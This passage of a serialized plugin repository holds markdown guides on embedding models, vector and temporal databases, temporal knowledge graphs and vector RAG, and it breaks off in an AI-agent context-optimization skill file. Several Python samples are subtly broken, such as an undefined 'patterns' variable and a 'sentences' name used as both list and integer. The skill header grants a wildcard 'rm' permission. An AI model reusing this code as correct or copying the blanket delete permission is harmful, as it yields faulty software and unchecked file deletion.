Embeddings\n\n**Model:** text-embedding-ada-002\n**Dimensions:** 1536\n\n#### Pros\n- GOOD High quality\n- GOOD Easy to use\n- GOOD Good documentation\n- GOOD Regular updates\n- GOOD Multilingual support\n\n#### Cons\n- BAD Expensive\n- BAD API dependency\n- BAD Rate limits\n- BAD No fine-tuning\n\n#### Best For\n- Production applications\n- High-quality requirements\n- When cost is not primary concern\n- General-purpose embedding\n\n#### Example Usage\n```python\nimport openai\n\nresponse = openai.embeddings.create(\n    model=\"text-embedding-ada-002\",\n    input=\"Your text here\"\n)\n\nembedding = response.data[0].embedding\n```\n\n### Cohere Embeddings\n\n**Model:** embed-multilingual-v3.0\n**Dimensions:** 1024\n\n#### Pros\n- GOOD Multilingual\n- GOOD Good quality\n- GOOD Competitive pricing\n- GOOD Easy API\n\n#### Cons\n- BAD API dependency\n- BAD Less ecosystem\n- BAD Fewer options\n\n#### Best For\n- Multilingual applications\n- Cost-sensitive projects\n- When OpenAI is too expensive\n\n### Hugging Face (Local)\n\n**Model:** all-MiniLM-L6-v2\n**Dimensions:** 384\n\n#### Pros\n- GOOD Free to use\n- GOOD No API dependency\n- GOOD Offline capable\n- GOOD Fast\n- GOOD Open source\n\n#### Cons\n- BAD Lower quality than API models\n- BAD No updates\n- BAD Hardware requirements\n- BAD Limited support\n\n#### Best For\n- Budget-conscious projects\n- Offline applications\n- Prototyping\n- Privacy-sensitive data\n\n#### Example Usage\n```python\nfrom sentence_transformers import SentenceTransformer\n\nmodel = SentenceTransformer('all-MiniLM-L6-v2')\n\n# Embed texts\nembeddings = model.encode([\n    \"First sentence\",\n    \"Second sentence\"\n])\n\n# Or single text\nembedding = model.encode(\"Single sentence\")\n```\n\n### Local Models Comparison\n\n| Model | Dimensions | Speed | Quality | Memory |\n|-------|------------|-------|---------|--------|\n| **all-MiniLM-L6-v2** | 384 | Fast | Medium | 90MB |\n| **all-mpnet-base-v2** | 768 | Medium | High | 440MB |\n| **multilingual-e5-large** | 1024 | Slow | Very High | 2.2GB |\n\n## Temporal Databases\n\n### InfluxDB\n\n**Type:** Time-series database\n**License:** MIT (Open Source) / Enterprise\n\n#### Pros\n- GOOD Purpose-built for time-series\n- GOOD Good compression\n- GOOD High write throughput\n- GOOD Built-in analytics\n- GOOD Flux query language\n\n#### Cons\n- BAD Learning curve\n- BAD Specialized use case\n- BAD Limited relational features\n\n#### Best For\n- Time-series data\n- High write throughput\n- Real-time analytics\n- IoT applications\n\n### TimescaleDB\n\n**Type:** PostgreSQL extension for time-series\n**License:** PostgreSQL License\n\n#### Pros\n- GOOD SQL-based\n- GOOD PostgreSQL ecosystem\n- GOOD ACID compliance\n- GOOD Good performance\n- GOOD Hypertable abstraction\n\n#### Cons\n- BAD Requires SQL expertise\n- BAD PostgreSQL limitations\n- BAD Less specialized than InfluxDB\n\n#### Best For\n- Existing PostgreSQL stacks\n- SQL-based time-series\n- Transactional requirements\n- Hybrid storage needs\n\n## Full-Stack Recommendations\n\n### Simple Q&A System\n```\nVector DB: ChromaDB\nEmbeddings: OpenAI or Hugging Face\nLLM: GPT-4 or Claude\n```\n\n### Entity-Centric System\n```\nVector DB: Pinecone or ChromaDB\nGraph DB: Neo4j or ArangoDB\nNER: spaCy or Hugging Face\nLLM: GPT-4\n```\n\n### Temporal Analytics System\n```\nTemporal DB: InfluxDB or TimescaleDB\nGraph DB: Neo4j\nVector DB: Pinecone\nML: scikit-learn or Prophet\nLLM: GPT-4\n```\n\n### Enterprise System\n```\nVector DB: Pinecone (managed)\nGraph DB: Neo4j Enterprise or Neptune\nEmbeddings: OpenAI (enterprise)\nLLM: GPT-4 API\nInfrastructure: Kubernetes + AWS/GCP\n```\n\n### Budget-Conscious System\n```\nVector DB: ChromaDB\nGraph DB: NetworkX (small) or Neo4j Community\nEmbeddings: Hugging Face (local)\nLLM: Open-source (e.g., Llama 2)\nInfrastructure: Single server or Docker\n```\n\n## Cost Estimation\n\n### Simple Q&A (10K queries/month)\n- ChromaDB: $0 (self-hosted)\n- OpenAI Embeddings: ~$10\n- GPT-4: ~$100\n- **Total: ~$110/month**\n\n### Entity-Centric (100K queries/month)\n- Pinecone: ~$500\n- Neo4j: ~$1000\n- OpenAI: ~$500\n- **Total: ~$2000/month**\n\n### Temporal Analytics (1M events/month)\n- InfluxDB: ~$200\n- Neo4j: ~$2000\n- OpenAI: ~$1000\n- Infrastructure: ~$500\n- **Total: ~$3700/month**\n\n## Technology Selection Guide\n\n### Decision Matrix\n\n| Requirement | Recommended Technology |\n|-------------|------------------------|\n| **Low budget** | ChromaDB + Hugging Face |\n| **High scalability** | Pinecone + Neptune |\n| **Open source only** | ChromaDB + NetworkX + InfluxDB |\n| **Enterprise features** | Pinecone + Neo4j Enterprise |\n| **Easy to use** | ChromaDB + OpenAI |\n| **Multi-model** | ArangoDB |\n| **SQL-based** | Pgvector + Neo4j |\n| **Python-heavy** | NetworkX + Hugging Face |\n| **Cloud-native** | Pinecone + Neptune |\n| **On-premises** | ChromaDB + Neo4j |\n\n### Technology Evolution Path\n\n```\nStage 1: Simple (ChromaDB + Hugging Face)\n    \nStage 2: Scalable (Pinecone + Neo4j)\n    \nStage 3: Advanced (Pinecone + Neo4j Enterprise + InfluxDB)\n```\n\n## Best Practices\n\n### Do's\nGOOD Choose technology based on actual requirements\nGOOD Start simple and evolve\nGOOD Consider total cost of ownership\nGOOD Evaluate vendor lock-in risks\nGOOD Test with realistic data volumes\nGOOD Plan for scaling from the beginning\nGOOD Consider team expertise\n\n### Don'ts\nBAD Over-engineer for future needs\nBAD Choose technology without testing\nBAD Ignore operational costs\nBAD Get locked into proprietary formats\nBAD Forget about data migration\nBAD Skip performance testing\nBAD Ignore vendor stability\n\n### Technology Stack Anti-Patterns\n- BAD Using Neo4j for simple document search\n- BAD Using Pinecone for 1K documents\n- BAD Using NetworkX for production graphs\n- BAD Using local models for high-volume API\n- BAD Choosing proprietary without evaluation\n- BAD Ignoring team skill requirements\n",
        "plugins/sys-agents/skills/architecting-memory/references/temporal-kg.md": "# Temporal Knowledge Graphs Implementation\n\nComplete guide to implementing Temporal Knowledge Graphs for time-sensitive reasoning.\n\n## Architecture Overview\n\n```\nQUERY  Extract Time  Graph Traversal  Temporal Filtering  Rank  Context\n```\n\n## Core Concepts\n\n### Temporal Entities\n- **Events**: Things that happen at specific times\n- **States**: Conditions that persist over time periods\n- **Time Intervals**: Start and end times for events/states\n\n### Temporal Relationships\n- **Before/After**: Chronological ordering\n- **During**: Event happens within time period\n- **Overlaps**: Time periods intersect\n- **Starts/Ends**: Temporal boundaries\n\n## Temporal Graph Structure\n\n### Time Representation\n```python\nfrom datetime import datetime, timedelta\nfrom typing import Optional, List, Tuple\n\nclass TemporalEntity:\n    def __init__(\n        self,\n        id: str,\n        type: str,\n        text: str,\n        start_time: Optional[datetime] = None,\n        end_time: Optional[datetime] = None,\n        valid_time: Optional[Tuple[datetime, datetime]] = None\n    ):\n        self.id = id\n        self.type = type\n        self.text = text\n        self.start_time = start_time\n        self.end_time = end_time\n        self.valid_time = valid_time  # (valid_from, valid_until)\n\n    def is_active_at(self, timestamp: datetime) -> bool:\n        \"\"\"Check if entity is active at given time\"\"\"\n        if self.valid_time:\n            return self.valid_time[0] <= timestamp <= self.valid_time[1]\n        return True  # Always valid if no time constraint\n```\n\n### Temporal Relationship\n```python\nclass TemporalRelationship:\n    def __init__(\n        self,\n        source: str,\n        target: str,\n        type: str,\n        start_time: Optional[datetime] = None,\n        end_time: Optional[datetime] = None,\n        timestamp: Optional[datetime] = None\n    ):\n        self.source = source\n        self.target = target\n        self.type = type\n        self.start_time = start_time\n        self.end_time = end_time\n        self.timestamp = timestamp  # For instantaneous events\n\n    def is_valid_at(self, timestamp: datetime) -> bool:\n        \"\"\"Check if relationship is valid at given time\"\"\"\n        if self.timestamp:\n            return abs((timestamp - self.timestamp).total_seconds()) < 1  # Within 1 second\n\n        if self.start_time and self.end_time:\n            return self.start_time <= timestamp <= self.end_time\n\n        return True\n```\n\n## Temporal Knowledge Graph\n\n```python\nimport networkx as nx\nfrom datetime import datetime\nfrom collections import defaultdict\n\nclass TemporalKnowledgeGraph:\n    def __init__(self):\n        self.graph = nx.MultiDiGraph()\n        self.time_index = defaultdict(list)  # time -> list of entities/relationships\n        self.event_sequence = []  # Chronological sequence of events\n\n    def add_temporal_entity(self, entity: TemporalEntity):\n        \"\"\"Add entity with temporal information\"\"\"\n        self.graph.add_node(\n            entity.id,\n            **entity.__dict__,\n            temporal=True\n        )\n\n        # Index by time\n        if entity.valid_time:\n            self._index_temporal(entity.id, entity.valid_time[0], entity.valid_time[1])\n\n    def add_temporal_relationship(self, relationship: TemporalRelationship):\n        \"\"\"Add relationship with temporal information\"\"\"\n        self.graph.add_edge(\n            relationship.source,\n            relationship.target,\n            **relationship.__dict__,\n            temporal=True\n        )\n\n        # Index by time\n        if relationship.timestamp:\n            self._index_event(relationship)\n        elif relationship.start_time and relationship.end_time:\n            self._index_temporal(relationship.source, relationship.start_time, relationship.end_time)\n\n    def _index_event(self, relationship: TemporalRelationship):\n        \"\"\"Index instantaneous event\"\"\"\n        self.time_index[relationship.timestamp].append({\n            \"type\": \"event\",\n            \"relationship\": relationship\n        })\n\n        self.event_sequence.append({\n            \"timestamp\": relationship.timestamp,\n            \"source\": relationship.source,\n            \"target\": relationship.target,\n            \"type\": relationship.type\n        })\n\n        # Keep sorted\n        self.event_sequence.sort(key=lambda x: x[\"timestamp\"])\n\n    def _index_temporal(self, entity_id: str, start: datetime, end: datetime):\n        \"\"\"Index entity active over time period\"\"\"\n        current = start\n        while current <= end:\n            self.time_index[current].append({\n                \"type\": \"entity\",\n                \"id\": entity_id,\n                \"active\": True\n            })\n            current += timedelta(days=1)\n\n    def get_entities_active_at(self, timestamp: datetime) -> List[str]:\n        \"\"\"Get all entities active at specific time\"\"\"\n        active_entities = []\n\n        for entity_id in self.graph.nodes():\n            entity_data = self.graph.nodes[entity_id]\n            if entity_data.get(\"temporal\", False):\n                temporal_entity = TemporalEntity(**entity_data)\n                if temporal_entity.is_active_at(timestamp):\n                    active_entities.append(entity_id)\n\n        return active_entities\n\n    def get_events_between(self, start: datetime, end: datetime) -> List[dict]:\n        \"\"\"Get all events in time range\"\"\"\n        events = []\n        for event in self.event_sequence:\n            if start <= event[\"timestamp\"] <= end:\n                events.append(event)\n        return events\n\n    def find_causal_paths(self, source: str, target: str, max_hops: int = 3) -> List[dict]:\n        \"\"\"Find causal paths between entities\"\"\"\n        # Implementation for finding causal chains\n        # Consider temporal ordering of events\n        pass\n\n    def predict_future_state(self, entity_id: str, future_time: datetime) -> dict:\n        \"\"\"Predict entity state at future time\"\"\"\n        # Use temporal patterns to predict state\n        # This is simplified - in practice use ML models\n        pass\n```\n\n## Temporal Query Processing\n\n### Time-Based Retrieval\n```python\nclass TemporalQueryProcessor:\n    def __init__(self, graph: TemporalKnowledgeGraph):\n        self.graph = graph\n\n    def process_query(self, query: str, time_constraint: Optional[str] = None) -> List[dict]:\n        \"\"\"Process query with temporal constraints\"\"\"\n\n        # Parse time from query\n        parsed_time = self._parse_temporal_expression(query)\n\n        if time_constraint:\n            start, end = self._parse_time_constraint(time_constraint)\n        else:\n            start, end = None, None\n\n        # Retrieve based on time\n        if start and end:\n            return self._retrieve_in_range(start, end)\n        elif start:\n            return self._retrieve_from_time(start)\n        elif parsed_time:\n            return self._retrieve_at_time(parsed_time)\n        else:\n            return self._retrieve_without_time(query)\n\n    def _retrieve_in_range(self, start: datetime, end: datetime) -> List[dict]:\n        \"\"\"Retrieve all entities and events in time range\"\"\"\n        results = []\n\n        # Get entities active in range\n        for entity_id in self.graph.nodes():\n            entity_data = self.graph.nodes[entity_id]\n            if entity_data.get(\"temporal\", False):\n                temporal_entity = TemporalEntity(**entity_data)\n                if temporal_entity.is_active_at(start) or temporal_entity.is_active_at(end):\n                    results.append({\n                        \"entity\": temporal_entity,\n                        \"relevance\": 1.0\n                    })\n\n        # Get events in range\n        events = self.graph.get_events_between(start, end)\n        for event in events:\n            results.append({\n                \"event\": event,\n                \"relevance\": 1.0\n            })\n\n        return results\n\n    def _parse_temporal_expression(self, query: str) -> Optional[datetime]:\n        \"\"\"Parse temporal expressions in natural language\"\"\"\n        # Handle expressions like \"last week\", \"yesterday\", \"5 days ago\"\n        # This is simplified - use libraries like dateutil or chrono\n        import re\n\n        patterns = {\n            r\"yesterday\": datetime.now() - timedelta(days=1),\n            r\"last week\": datetime.now() - timedelta(weeks=1),\n            r\"last month\": datetime.now() - timedelta(days=30),\n        }\n\n        for pattern, time in patterns.items():\n            if re.search(pattern, query.lower()):\n                return time\n\n        return None\n```\n\n### Event Sequence Analysis\n```python\nclass EventSequenceAnalyzer:\n    def __init__(self, graph: TemporalKnowledgeGraph):\n        self.graph = graph\n\n    def find_patterns(self, pattern_type: str = \"sequential\") -> List[dict]:\n        \"\"\"Find temporal patterns in event sequences\"\"\"\n        if pattern_type == \"sequential\":\n            return self._find_sequential_patterns()\n        elif pattern_type == \"periodic\":\n            return self._find_periodic_patterns()\n        elif pattern_type == \"causal\":\n            return self._find_causal_patterns()\n\n    def _find_sequential_patterns(self) -> List[dict]:\n        \"\"\"Find sequential event patterns\"\"\"\n        patterns = []\n\n        # Look for event chains\n        for i in range(len(self.graph.event_sequence) - 1):\n            for j in range(i + 1, min(i + 5, len(self.graph.event_sequence))):\n                chain = self.graph.event_sequence[i:j]\n                pattern = {\n                    \"type\": \"sequential\",\n                    \"events\": [e[\"type\"] for e in chain],\n                    \"count\": 1,\n                    \"occurrences\": [(chain[0][\"timestamp\"], chain[-1][\"timestamp\"])]\n                }\n                patterns.append(pattern)\n\n        return patterns\n\n    def _find_periodic_patterns(self) -> List[dict]:\n        \"\"\"Find periodic event patterns\"\"\"\n        patterns = []\n\n        # Group events by type\n        events_by_type = defaultdict(list)\n        for event in self.graph.event_sequence:\n            events_by_type[event[\"type\"]].append(event[\"timestamp\"])\n\n        # Check for periodicity\n        for event_type, timestamps in events_by_type.items():\n            if len(timestamps) < 3:\n                continue\n\n            # Calculate intervals\n            intervals = []\n            for i in range(len(timestamps) - 1):\n                interval = (timestamps[i+1] - timestamps[i]).total_seconds()\n                intervals.append(interval)\n\n            # Check if intervals are similar\n            avg_interval = sum(intervals) / len(intervals)\n            variance = sum((i - avg_interval)**2 for i in intervals) / len(intervals)\n\n            if variance < avg_interval * 0.1:  # Low variance = periodic\n                patterns.append({\n                    \"type\": \"periodic\",\n                    \"event_type\": event_type,\n                    \"avg_interval\": avg_interval,\n                    \"occurrences\": timestamps\n                })\n\n        return patterns\n```\n\n### Predictive Temporal Modeling\n```python\nclass TemporalPredictor:\n    def __init__(self, graph: TemporalKnowledgeGraph):\n        self.graph = graph\n        self.patterns = self._learn_patterns()\n\n    def _learn_patterns(self) -> dict:\n        \"\"\"Learn temporal patterns from graph\"\"\"\n        patterns = {\n            \"sequential\": {},\n            \"periodic\": {},\n            \"causal\": {}\n        }\n\n        # Learn sequential patterns\n        event_types = [e[\"type\"] for e in self.graph.event_sequence]\n        for i in range(len(event_types) - 1):\n            pair = (event_types[i], event_types[i+1])\n            patterns[\"sequential\"][pair] = patterns[\"sequential\"].get(pair, 0) + 1\n\n        return patterns\n\n    def predict_next_event(self, current_event: str) -> List[Tuple[str, float]]:\n        \"\"\"Predict likely next events\"\"\"\n        predictions = []\n\n        for next_event, count in patterns[\"sequential\"].items():\n            if next_event[0] == current_event:\n                probability = count / sum(patterns[\"sequential\"].values())\n                predictions.append((next_event[1], probability))\n\n        return sorted(predictions, key=lambda x: x[1], reverse=True)\n\n    def predict_entity_state(self, entity_id: str, future_time: datetime) -> dict:\n        \"\"\"Predict entity state at future time\"\"\"\n        # Get historical states\n        states = self._get_entity_state_history(entity_id)\n\n        if not states:\n            return {\"prediction\": \"unknown\", \"confidence\": 0.0}\n\n        # Simple prediction based on trend\n        # In practice, use time series models\n        last_state = states[-1]\n\n        return {\n            \"prediction\": last_state[\"state\"],\n            \"confidence\": 0.6,  # Simplified\n            \"basis\": \"trend_analysis\"\n        }\n\n    def _get_entity_state_history(self, entity_id: str) -> List[dict]:\n        \"\"\"Get historical states of entity\"\"\"\n        # Simplified - track state changes over time\n        # In practice, extract from temporal graph\n        return []\n```\n\n## Temporal Reasoning\n\n### Before/After Reasoning\n```python\ndef check_temporal_relationship(\n    entity1: str,\n    entity2: str,\n    relationship_type: str,\n    graph: TemporalKnowledgeGraph\n) -> str:\n    \"\"\"Check temporal relationship between two entities\"\"\"\n\n    # Get temporal data\n    data1 = graph.graph.nodes[entity1]\n    data2 = graph.graph.nodes[entity2]\n\n    if relationship_type == \"BEFORE\":\n        if data1.get(\"end_time\") and data2.get(\"start_time\"):\n            return data1[\"end_time\"] < data2[\"start_time\"]\n\n    elif relationship_type == \"AFTER\":\n        if data1.get(\"start_time\") and data2.get(\"end_time\"):\n            return data1[\"start_time\"] > data2[\"end_time\"]\n\n    elif relationship_type == \"DURING\":\n        if data1.get(\"start_time\") and data1.get(\"end_time\"):\n            if data2.get(\"start_time\"):\n                return data1[\"start_time\"] <= data2[\"start_time\"] <= data1[\"end_time\"]\n\n    return None\n```\n\n### Temporal Consistency Checking\n```python\nclass TemporalConsistencyChecker:\n    def __init__(self, graph: TemporalKnowledgeGraph):\n        self.graph = graph\n\n    def check_consistency(self) -> List[dict]:\n        \"\"\"Check for temporal inconsistencies\"\"\"\n        inconsistencies = []\n\n        # Check for contradictions\n        for node in self.graph.graph.nodes():\n            node_data = self.graph.nodes[node]\n\n            # Check if entity is active at multiple conflicting times\n            active_times = self._get_active_times(node)\n            if self._has_temporal_conflicts(active_times):\n                inconsistencies.append({\n                    \"type\": \"temporal_conflict\",\n                    \"entity\": node,\n                    \"description\": \"Entity appears active at conflicting times\"\n                })\n\n        return inconsistencies\n\n    def _get_active_times(self, entity_id: str) -> List[Tuple[datetime, datetime]]:\n        \"\"\"Get all active time periods for entity\"\"\"\n        # Simplified - extract from temporal graph\n        return []\n\n    def _has_temporal_conflicts(self, active_times: List[Tuple[datetime, datetime]]) -> bool:\n        \"\"\"Check if time periods conflict\"\"\"\n        # Check for overlapping periods\n        for i, (start1, end1) in enumerate(active_times):\n            for start2, end2 in active_times[i+1:]:\n                if self._periods_overlap(start1, end1, start2, end2):\n                    return True\n        return False\n\n    def _periods_overlap(self, start1: datetime, end1: datetime, start2: datetime, end2: datetime) -> bool:\n        \"\"\"Check if two time periods overlap\"\"\"\n        return start1 < end2 and start2 < end1\n```\n\n## Integration with Vector RAG and GraphRAG\n\n### Hybrid Temporal Retrieval\n```python\nclass TemporalGraphRAG:\n    def __init__(self, temporal_graph: TemporalKnowledgeGraph, vector_db):\n        self.temporal_graph = temporal_graph\n        self.vector_db = vector_db\n\n    def retrieve(self, query: str, time_constraint: Optional[str] = None) -> List[dict]:\n        \"\"\"Retrieve using temporal + semantic search\"\"\"\n\n        # Parse temporal constraints\n        start, end = self._parse_time_constraint(time_constraint)\n\n        # Get temporal results\n        temporal_results = self._retrieve_temporal(start, end)\n\n        # Get semantic results\n        semantic_results = self.vector_db.query(\n            query_embeddings=[self._embed_query(query)],\n            n_results=10\n        )\n\n        # Combine and rank\n        combined = self._combine_results(temporal_results, semantic_results, query)\n\n        return combined\n\n    def _retrieve_temporal(self, start: Optional[datetime], end: Optional[datetime]) -> List[dict]:\n        \"\"\"Retrieve from temporal graph\"\"\"\n        if start and end:\n            return self.temporal_graph.get_events_between(start, end)\n        elif start:\n            return self.temporal_graph.get_entities_active_at(start)\n        else:\n            return []\n```\n\n## Best Practices\n\n### Do's\nGOOD Use proper time representations (datetime objects)\nGOOD Index temporal information for fast retrieval\nGOOD Validate temporal consistency\nGOOD Handle time zones appropriately\nGOOD Support both instantaneous events and time periods\nGOOD Use temporal reasoning for better context\n\n### Don'ts\nBAD Don't ignore time zones\nBAD Don't use string representations for time\nBAD Don't store all events without indexing\nBAD Don't forget temporal consistency checks\nBAD Don't assume time flows linearly\nBAD Don't ignore uncertainty in temporal data\n\n## Applications\n\n### Use Case 1: Event Tracking\n- Track events over time\n- Find patterns and trends\n- Predict future events\n\n### Use Case 2: Historical Analysis\n- Understand historical context\n- Analyze temporal trends\n- Extract temporal insights\n\n### Use Case 3: Predictive Analytics\n- Predict future states\n- Forecast events\n- Model temporal evolution\n\n### Use Case 4: Audit and Compliance\n- Track changes over time\n- Verify temporal sequences\n- Ensure compliance with time-based rules\n",
        "plugins/sys-agents/skills/architecting-memory/references/vector-rag.md": "# Vector RAG Implementation Guide\n\nComplete guide to implementing Vector RAG (Retrieval-Augmented Generation) for semantic retrieval.\n\n## Architecture Overview\n\n```\nQUERY  Embed Query  Vector Search  Retrieve Top-K  Add to Context\n```\n\n## Implementation Steps\n\n### Step 1: Setup Vector Database\n\n```python\nimport chromadb\nfrom chromadb.config import Settings\n\n# Initialize ChromaDB\nclient = chromadb.Client(Settings(\n    persist_directory=\"./vector_db\",\n    anonymized_telemetry=False\n))\n\n# Create collection\ncollection = client.create_collection(\n    name=\"documents\",\n    embedding_function=embedding_function\n)\n```\n\n### Step 2: Document Ingestion\n\n```python\ndef ingest_document(document_id: str, content: str, metadata: dict):\n    \"\"\"Ingest document into vector database\"\"\"\n    # Generate embedding\n    embedding = embedding_function.embed_query(content)\n\n    # Add to collection\n    collection.add(\n        ids=[document_id],\n        documents=[content],\n        embeddings=[embedding],\n        metadatas=[metadata]\n    )\n```\n\n### Step 3: Query Processing\n\n```python\ndef retrieve_relevant_docs(query: str, top_k: int = 5):\n    \"\"\"Retrieve relevant documents for query\"\"\"\n    # Embed query\n    query_embedding = embedding_function.embed_query(query)\n\n    # Search\n    results = collection.query(\n        query_embeddings=[query_embedding],\n        n_results=top_k\n    )\n\n    return results\n```\n\n## Embedding Models\n\n### OpenAI Embeddings\n```python\nimport openai\n\nclass OpenAIEmbeddings:\n    def __init__(self, model=\"text-embedding-ada-002\"):\n        self.client = openai.OpenAI()\n        self.model = model\n\n    def embed_query(self, text: str):\n        response = self.client.embeddings.create(\n            model=self.model,\n            input=text\n        )\n        return response.data[0].embedding\n```\n\n### Local Embeddings (Hugging Face)\n```python\nfrom sentence_transformers import SentenceTransformer\n\nclass LocalEmbeddings:\n    def __init__(self, model_name=\"all-MiniLM-L6-v2\"):\n        self.model = SentenceTransformer(model_name)\n\n    def embed_query(self, text: str):\n        return self.model.encode(text).tolist()\n```\n\n## Chunking Strategies\n\n### Fixed-Size Chunking\n```python\ndef chunk_text(text: str, chunk_size: int = 1000, overlap: int = 200):\n    \"\"\"Split text into overlapping chunks\"\"\"\n    chunks = []\n    start = 0\n\n    while start < len(text):\n        end = start + chunk_size\n        chunk = text[start:end]\n\n        chunks.append({\n            \"text\": chunk,\n            \"start\": start,\n            \"end\": end\n        })\n\n        start = end - overlap\n\n    return chunks\n```\n\n### Semantic Chunking\n```python\ndef semantic_chunk_text(text: str, sentences: int = 5):\n    \"\"\"Split text into semantic chunks\"\"\"\n    # Use NLTK or spaCy to split into sentences\n    sentences = split_into_sentences(text)\n\n    chunks = []\n    for i in range(0, len(sentences), sentences):\n        chunk = \" \".join(sentences[i:i + sentences])\n        chunks.append(chunk)\n\n    return chunks\n```\n\n## Retrieval Strategies\n\n### Hybrid Search\n```python\ndef hybrid_search(query: str, top_k: int = 5):\n    \"\"\"Combine vector search with keyword search\"\"\"\n    # Vector search\n    vector_results = collection.query(\n        query_embeddings=[embedding_function.embed_query(query)],\n        n_results=top_k * 2  # Get more to filter\n    )\n\n    # Keyword search (using BM25 or similar)\n    keyword_results = keyword_search(query, top_k=top_k)\n\n    # Combine and rerank\n    combined = combine_results(vector_results, keyword_results)\n\n    return combined[:top_k]\n```\n\n### Reranking\n```python\ndef rerank_results(query: str, results: list, reranker: callable):\n    \"\"\"Rerank results using cross-encoder\"\"\"\n    # Use cross-encoder for better ranking\n    pairs = [(query, doc) for doc in results[\"documents\"]]\n    scores = reranker(pairs)\n\n    # Sort by score\n    ranked = sorted(zip(results[\"documents\"], scores), key=lambda x: x[1], reverse=True)\n\n    return ranked\n```\n\n## Advanced Techniques\n\n### Query Expansion\n```python\ndef expand_query(query: str, llm: callable):\n    \"\"\"Expand query using LLM to improve retrieval\"\"\"\n    prompt = f\"\"\"\n    Expand this query to improve document retrieval:\n    Original: {query}\n\n    Provide 3 alternative phrasings that capture the same meaning:\n    \"\"\"\n\n    response = llm(prompt)\n    expanded_queries = parse_queries(response)\n\n    # Search with all queries\n    all_results = []\n    for q in expanded_queries:\n        results = retrieve_relevant_docs(q, top_k=3)\n        all_results.extend(results)\n\n    # Deduplicate and rerank\n    return deduplicate_and_rerank(all_results)\n```\n\n### Self-Query\n```python\ndef self_query(query: str, metadata: dict, llm: callable):\n    \"\"\"Use LLM to extract semantic query and filters\"\"\"\n    prompt = f\"\"\"\n    Given this query and metadata schema, extract:\n    1. Semantic search query\n    2. Metadata filters\n\n    Query: {query}\n    Metadata schema: {list(metadata.keys())}\n\n    Respond as JSON:\n    {{\n        \"query\": \"semantic query\",\n        \"filters\": {{\"field\": \"value\"}}\n    }}\n    \"\"\"\n\n    response = llm(prompt)\n    parsed = json.loads(response)\n\n    # Search with filters\n    results = collection.query(\n        query_embeddings=[embedding_function.embed_query(parsed[\"query\"])],\n        n_results=10,\n        where=parsed[\"filters\"]\n    )\n\n    return results\n```\n\n## Evaluation\n\n### Retrieval Metrics\n```python\ndef evaluate_retrieval(queries: list, relevant_docs: dict, retrieved_docs: dict):\n    \"\"\"Evaluate retrieval quality\"\"\"\n    results = []\n\n    for query in queries:\n        relevant = set(relevant_docs[query])\n        retrieved = set(retrieved_docs[query])\n\n        precision = len(relevant & retrieved) / len(retrieved)\n        recall = len(relevant & retrieved) / len(relevant)\n        f1 = 2 * (precision * recall) / (precision + recall)\n\n        results.append({\n            \"query\": query,\n            \"precision\": precision,\n            \"recall\": recall,\n            \"f1\": f1\n        })\n\n    # Calculate averages\n    avg_precision = sum(r[\"precision\"] for r in results) / len(results)\n    avg_recall = sum(r[\"recall\"] for r in results) / len(results)\n    avg_f1 = sum(r[\"f1\"] for r in results) / len(results)\n\n    return {\n        \"precision\": avg_precision,\n        \"recall\": avg_recall,\n        \"f1\": avg_f1\n    }\n```\n\n## Best Practices\n\n### Do's\nGOOD Use appropriate chunk sizes (500-1000 tokens)\nGOOD Add overlap between chunks to preserve context\nGOOD Store metadata for filtering\nGOOD Use domain-specific embedding models when available\nGOOD Implement query expansion for better recall\nGOOD Monitor and evaluate retrieval quality regularly\n\n### Don'ts\nBAD Don't use chunks that are too large\nBAD Don't ignore metadata\nBAD Don't rely solely on semantic similarity\nBAD Don't forget to update embeddings when models improve\nBAD Don't use generic embeddings for specialized domains\nBAD Don't skip evaluation\n\n## Common Issues\n\n### Issue 1: Low Recall\n**Solution:**\n- Expand queries\n- Use hybrid search (semantic + keyword)\n- Adjust chunk sizes\n- Add query variations\n\n### Issue 2: Low Precision\n**Solution:**\n- Use reranking\n- Add metadata filters\n- Use domain-specific embeddings\n- Implement query expansion\n\n### Issue 3: Slow Retrieval\n**Solution:**\n- Use approximate nearest neighbor (ANN) indexes\n- Implement caching\n- Use smaller embedding dimensions\n- Optimize chunk sizes\n\n## Performance Optimization\n\n### Caching\n```python\nfrom functools import lru_cache\n\n@lru_cache(maxsize=1000)\ndef cached_embed(text: str):\n    \"\"\"Cache embeddings to avoid recomputation\"\"\"\n    return embedding_function.embed_query(text)\n```\n\n### Batch Processing\n```python\ndef batch_embed_texts(texts: list, batch_size: int = 100):\n    \"\"\"Batch process embeddings for efficiency\"\"\"\n    results = []\n\n    for i in range(0, len(texts), batch_size):\n        batch = texts[i:i + batch_size]\n        embeddings = embedding_function.encode(batch)\n        results.extend(embeddings)\n\n    return results\n```\n\n### Approximate Nearest Neighbor\n```python\n# Use FAISS for fast approximate search\nimport faiss\n\nclass FAISSIndex:\n    def __init__(self, dimension: int):\n        self.index = faiss.IndexFlatIP(dimension)  # Inner product\n        self.dimension = dimension\n\n    def add(self, embeddings: list):\n        \"\"\"Add embeddings to index\"\"\"\n        self.index.add(embeddings)\n\n    def search(self, query_embedding: list, top_k: int = 5):\n        \"\"\"Search for similar embeddings\"\"\"\n        scores, indices = self.index.search(query_embedding, top_k)\n        return scores, indices\n```\n",
        "plugins/sys-agents/skills/optimizing-context/SKILL.md": "---\nname: optimizing-context\ndescription: \"Provides unified interface for all context engineering patterns. Use when optimizing AI agent context: compression, degradation detection, KV-cache optimization, or session management.\"\nuser-invocable: true\nallowed-tools: [Read, Write, Edit, Bash(ls:*), Bash(cat:*), Bash(rm:*), Glob, Grep]\n---\n\n# Context Engineering\n\nUnified skill for all context engineering patterns in AI agent systems. This skill consolidates context management, compression, degradation detection, and KV-cache optimization into a single entry point with progressive disclosure.\n\n## Quick Decision Matrix\n\n| Problem | Solution | Reference |\n|:--------|:---------|:----------|\n| Context window filling up | **Compression** | [compression.md](references/compression.md) |\n| Agent ignoring mid-context info | **Degradation Detection** | [degradation.md](references/degradation.md) |\n| High API costs | **KV-Cache Optimization** | [kv-cache.md](references/kv-cache.md) |\n| Session state persistence | **Session Management** | [session-management.md](references/session-management.md) |\n\n## Core Concepts\n\n### Context Window Thresholds\n\n| Utilization | Action | Technique |\n|:------------|:-------|:----------|\n| **<60%** | Monitor | No action needed |\n| **60-80%** | Light compression | Observation masking |\n| **80-95%** | Aggressive compression | Summarization + compaction |\n| **>95%** | Emergency | Force session handoff |\n\n### The Four-Bucket Framework\n\n1. **Write**: Save non-critical info outside context (scratchpads, files)\n2. **Select**: Pull only relevant context (high-precision retrieval)\n3. **Compress**: Reduce while preserving information\n4. **Isolate**: Separate contexts across sub-agents\n\n## Compression Techniques Summary\n\n| Technique | Token Overhead | 